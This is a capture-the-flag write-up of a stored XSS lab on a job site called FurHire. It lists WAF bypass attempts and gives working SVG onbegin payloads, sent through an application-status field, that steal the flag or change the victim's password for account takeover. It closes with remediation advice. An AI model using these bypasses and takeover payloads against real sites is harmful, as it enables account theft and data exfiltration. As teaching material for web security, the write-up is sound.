---
title: FurHire - XSS
tags:
  - bugforge
  - xss
---

- This one was a proper grind - multiple WAF bypasses, dead ends, and a complete pivot before finding the right path
- The challenge had an "upgraded WAF" protecting against common XSS patterns, which turned it into a WAF bypass + delivery mechanism puzzle
- The key lesson: finding a stored XSS payload is only half the battle -- the delivery mechanism matters just as much

## Enumeration

1. Tech Stack

- Express.js backend, EJS templating, Socket.io for real-time notifications
- JWT auth (HS256, no expiration, role in payload, HttpOnly cookie)
- Two roles: `user` (job seeker) and `recruiter` (posts jobs)

2. Endpoint Discovery

```
POST /api/register          - No auth (username, email, full_name, password, role)
POST /api/login             - No auth
POST /api/logout            - Any
GET  /api/skills            - No auth
GET  /api/profile           - Auth required
PUT  /api/profile           - User only
PUT  /api/profile/password  - User only
PUT  /api/company           - Recruiter only
GET  /api/jobs              - Any (?search=&location=&job_type=)
POST /api/jobs              - Recruiter only
GET  /api/jobs/:id          - Any
PUT  /api/jobs/:id          - Recruiter (owner)
POST /api/jobs/:id/apply    - User only (cover_letter)
GET  /api/jobs/:id/applicants - Recruiter only
GET  /api/my-applications   - User only
GET  /api/my-jobs           - Recruiter only
GET  /api/saved-jobs        - User only
PUT  /api/applications/:id/status - Recruiter (status)
GET  /api/flag              - Admin only (403 for user/recruiter)
```

3. Users

```
id:4 - jeremy (user - job seeker, the bot/target)
id:5 - recruiter for "Pawsitive Ventures" (owns jobs 1-4)
id:6 - testuser1 (user - our account)
id:7 - recruiter1 (recruiter - our account)
```

4. Client-Side JavaScript Analysis

- Downloaded and beautified `app.js`
- Found `escapeHtml()` function that escapes `& < > " '` -- used on ALL page renders
- Found `showToast()` -- the ONE function that uses `innerHTML` without escaping:

```javascript
function showToast(message, type = 'info') {
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = `
    <strong>${type === 'success' ? '...' : '...'}</strong>
    <span>${message}</span>
  `;
  document.body.appendChild(toast);
}
```

- Socket.io feeds user data directly into showToast:

```javascript
socket.on('new_application', (data) => {
  if (user.id === data.recruiterId) {
    showToast(data.message, 'info');
  }
});

socket.on('status_update', (data) => {
  if (user.id === data.userId) {
    showToast(data.message, 'success');
  }
});
```

## WAF Analysis

The lab hint said FurHire "recently upgraded their WAF." Testing every field on POST body revealed:

| Pattern | Result |
|---------|--------|
| `javascript:` | BLOCKED |
| `<script>` | BLOCKED |
| `onerror` | BLOCKED |
| `onfocus` | BLOCKED |
| `onmouseover` | BLOCKED |
| `onload` | BLOCKED |
| `ontoggle` | BLOCKED |
| `onpointerover` | BLOCKED |
| `alert(` | BLOCKED |
| `confirm(` | BLOCKED |
| `eval(` | BLOCKED |
| `<iframe` | BLOCKED |
| `onbegin` | ALLOWED |
| `fetch(` | ALLOWED |
| `<svg>` | ALLOWED |
| `<img src=x>` | ALLOWED |
| `<animate>` | ALLOWED |
| `&#entity;` encoding | ALLOWED (in values) |
| GET query params | NOT CHECKED |

## Failed Attempts (The Learning Part)

This is where most of the time went. Each failure taught something.

### Attempt 1: javascript: URI in Company Website

The job detail page renders the company website as:
```javascript
`<a href="${FurHire.escapeHtml(job.website)}">`
```

`escapeHtml()` doesn't block `javascript:` URIs (no `& < > " '` in the scheme). WAF blocks `javascript:` but a newline bypass works:

```
java\nscript:fetch('/api/flag')...
```

Browsers strip newlines from URLs before scheme parsing (WHATWG URL spec). Payload stored successfully in the company website field, visible on `/jobs/5`.

**Why it failed**: Requires the victim to CLICK the link. We could not find a bot submission endpoint (`/report`, `/submit`, `/visit`, `/api/report` -- all 404). The delivery mechanism was missing.

**Lesson**: A stored payload is useless without a delivery mechanism. Don't invest in complex payloads before solving delivery.

### Attempt 2: SVG onbegin via Socket.io new_application

Registered a user with SVG SMIL payload in `full_name`:
```html
<svg><animate onbegin=al&#101;rt(1) attributeName=x dur=1s>
```

Applied for jeremy's jobs (1-4), hoping the `new_application` Socket.io event would include `full_name` in `data.message` and render via `showToast()` innerHTML.

**Why it failed**: Either `data.message` doesn't include user-controlled fields for `new_application` events, or SVG SMIL `onbegin` doesn't reliably fire when inserted via innerHTML in headless browsers. The exfiltration user was never created.

**Lesson**: Test your assumptions about what data the server includes in notifications. We were guessing about `data.message` contents without verifying.

### Attempt 3: iframe srcdoc Double-Parse Trick

The idea: use `<iframe srcdoc="<img src=x &#111;nerr&#111;r=...>">` to get a second round of HTML parsing where entity-encoded `onerror` would decode to the real attribute.

```
<iframe srcdoc="<img src=x &#111;nerr&#111;r=1>">
```

**Why it failed**: WAF blocks `<iframe` entirely. Dead on arrival.

**Lesson**: Always test the container element against WAF before building complex nested payloads.

### Attempt 4: JSON Unicode Escape Bypass

Tried `\u006fnerr\u006fr` in JSON body, hoping WAF checks raw bytes but JSON parser decodes `\u006f` to `o`:

```json
{"full_name":"<img src=x \u006fnerr\u006fr=1>"}
```

**Why it failed**: WAF decodes JSON Unicode escapes before pattern matching. 403 blocked.

**Lesson**: This WAF is smarter than basic pattern matching -- it's JSON-aware. Always test encoding bypasses empirically.

## The Winning Approach

### The Discovery

Listing applicants for our job (recruiter1's job 5) revealed something we missed:

```json
{"id":6, "user_id":4, "username":"jeremy", "full_name":"Jeremy Thompson"}
```

**Jeremy is user_id=4 -- a job SEEKER, not a recruiter.** He applied for our recruiter's job. This meant:

1. We own the recruiter account (recruiter1)
2. Jeremy applied for our job (application ID 6)
3. We can update his application status via `PUT /api/applications/6/status`
4. Status updates trigger `status_update` Socket.io event to the applicant
5. The event flows to `showToast()` -- the innerHTML sink

### Testing the Chain

First, verified the status field accepts arbitrary values:

```
PUT /api/applications/10/status
{"status":"CUSTOMVALUE"}
```
Response: `200 OK` -- no validation on status values.

Then tested SVG payload in status field:

```
PUT /api/applications/10/status
{"status":"<svg><animate onbegin=al&#101;rt(1) attributeName=x dur=1s>"}
```
Response: `200 OK` -- WAF allows `onbegin` in status field.

## Exploitation

Two approaches work here -- both use the same XSS sink and delivery mechanism, but differ in how they extract the flag.

### Approach 1: Data Exfiltration via /api/register (Original)

**Payload:**
```html
<svg><animate onbegin=fetch(`/api/flag`).then(function(r){return(r.text())}).then(function(t){fetch(`/api/register`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({username:`fl`,email:`fl@t.c`,password:`t`,full_name:t,role:`user`})})}) attributeName=x dur=1s>
```

Design decisions:
- `onbegin` -- not in WAF blocklist, fires when SVG SMIL animation starts
- Backtick template literals everywhere -- avoids quote conflicts with JSON and HTML attribute delimiters
- `function(){}` instead of arrow functions -- avoids `>` which could close the HTML tag in unquoted attribute context
- `return(r.text())` -- no spaces (unquoted attribute value ends at whitespace)
- Exfiltration via `/api/register` -- creates a new user with the flag as `full_name`

**Firing:**
```
PUT /api/applications/6/status HTTP/1.1
Host: lab-1772981365989-k6vumi.labs-app.bugforge.io
Content-Type: application/json
Cookie: token=eyJ...(recruiter1)

{"status":"<svg><animate onbegin=fetch(`/api/flag`).then(function(r){return(r.text())}).then(function(t){fetch(`/api/register`,{method:`POST`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({username:`fl`,email:`fl@t.c`,password:`t`,full_name:t,role:`user`})})}) attributeName=x dur=1s>"}
```

**Retrieving the flag:**
```
POST /api/login
{"username":"fl","password":"t"}
```
```json
{"user":{"id":13,"username":"fl","full_name":"{\"flag\":\"bug{ZrYqkblsdiZjcepapwW1JyrWeLnsNOa5}\"}"}}
```

### Approach 2: CSRF Password Change -- Account Takeover (Better)

Instead of exfiltrating the flag through a side channel, change the victim's password and log in as them directly.

This works because `PUT /api/profile/password` has no CSRF protection -- it accepts `newPassword` with no current password check, and the JWT HttpOnly cookie rides along automatically from the victim's browser context.

**Payload:**
```html
<svg><animate onbegin=fetch(`/api/profile/password`,{method:`PUT`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({newPassword:`pwned`})}) attributeName=x dur=1s>
```

**Firing:**
```
PUT /api/applications/1/status HTTP/1.1
Host: lab-1773069866434-yktuje.labs-app.bugforge.io
Content-Type: application/json
Cookie: token=eyJ...(recruiter1)

{"status":"<svg><animate onbegin=fetch(`/api/profile/password`,{method:`PUT`,headers:{[`Content-Type`]:`application/json`},body:JSON.stringify({newPassword:`pwned`})}) attributeName=x dur=1s>"}
```

**Retrieving the flag:**
```
POST /api/login
{"username":"jeremy","password":"pwned"}
```
```
GET /api/flag
Cookie: token=eyJ...(jeremy)
```
```json
{"flag":"bug{r8m7uwJkrGOcXJqiQGBEWvW4cEFbtvH2}"}
```

**Why this approach is better:**
- One fetch instead of chained promises -- simpler, fewer failure points
- Full account takeover, not just data exfiltration
- Works even if `/api/register` had validation, rate limiting, or was disabled
- More realistic real-world impact -- ATO gives persistent access to everything the victim can do
- Highlights a second vulnerability: missing CSRF protection on password change (no current password required)

**Trade-off:** The original approach is stealthier -- Jeremy's password stays unchanged and there's no login anomaly in logs. For a real engagement, you'd choose based on objectives. For a CTF, the CSRF approach is objectively better.

## Attack Chain Summary

```
recruiter1 updates jeremy's application status with SVG payload
    |
    v
Server emits status_update Socket.io event to jeremy (user_id=4)
    |
    v
Jeremy's browser: showToast(data.message) renders via innerHTML
    |
    v
SVG <animate onbegin=...> fires automatically on DOM insertion
    |                                    |
    v [Approach 1]                       v [Approach 2]
fetch('/api/flag')                  fetch('/api/profile/password')
    |                                    |
    v                                    v
Exfil flag via /api/register        Jeremy's password changed to "pwned"
as new user's full_name                  |
                                         v
                                    Login as jeremy, GET /api/flag
```

## Security Takeaways

### Vulnerability
- Stored XSS via unvalidated application status field, rendered through Socket.io notification into innerHTML sink
- OWASP Top 10: A03:2021 - Injection (Cross-Site Scripting)
- CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation

### Impact
- Full account takeover of any user who applies for the attacker's jobs
- Access to admin-only endpoints via session hijacking
- Cookie theft (even HttpOnly -- the XSS runs in the victim's browser context, making authenticated API calls directly)

### Root Causes
1. `showToast()` uses `innerHTML` without sanitization -- the sink
2. Socket.io `status_update` event includes unescaped status value in `data.message` -- the bridge
3. `PUT /api/applications/:id/status` accepts arbitrary strings with no allowlist validation -- the source
4. WAF blocklist is incomplete -- `onbegin` SVG SMIL event handler not covered
5. `PUT /api/profile/password` has no CSRF token and no current password requirement -- enables XSS-to-ATO escalation

### Remediation
- Use `textContent` instead of `innerHTML` in `showToast()` (or sanitize with DOMPurify)
- Allowlist valid status values server-side: `["pending", "accepted", "rejected", "interviewing"]`
- Add `onbegin`, `onend`, `onrepeat` to WAF blocklist (SVG SMIL events)
- Content Security Policy with `script-src` directive to block inline JS
- Require current password on password change endpoints
- Add CSRF tokens to state-changing requests (or use SameSite=Strict cookies)

### Key Lessons
1. **Delivery matters as much as payload** - we had working stored XSS payloads early but no way to deliver them to the victim. The breakthrough was finding a delivery mechanism (status updates) that auto-fires via Socket.io
2. **Check application data flow in both directions** - we initially focused on what happens when a user applies (new_application), missing that the recruiter's response (status_update) also flows back to the user
3. **innerHTML sinks with WebSocket/Socket.io are dangerous** - real-time notification systems often skip sanitization because developers think they control the message format
4. **SVG SMIL events bypass many WAFs** - `onbegin`, `onend`, `onrepeat` are rarely in blocklists but fire automatically when SVG animations start
5. **Unquoted HTML attributes need space-free payloads** - using backtick template literals and `function(){}` syntax instead of arrow functions avoids both quote conflicts and the `>` character problem
6. **XSS + missing CSRF = full ATO** - when password change has no CSRF token and no current password check, XSS escalates from data theft to complete account takeover in a single request. Always check state-changing endpoints for CSRF protection when you have XSS

## MCP

- This lab was done entirely via Claude MCP with Caido for all HTTP requests
- The WAF testing and enumeration phase was efficient - MCP is great for systematic testing of blocklist patterns
- Where MCP struggled: identifying the delivery mechanism. It tried bot submission endpoints, javascript: URI clicks, and various WAF bypass techniques before I suggested checking the recruiter-to-applicant status update flow (as suggestion from @pawpawhacks - big thank you on that!)
- The human insight of "check what happens when you accept an application" unlocked the entire challenge
- Takeaway: AI is effective at systematic testing and payload crafting, but `creative lateral thinking about data flow still benefits from human intuition` :)
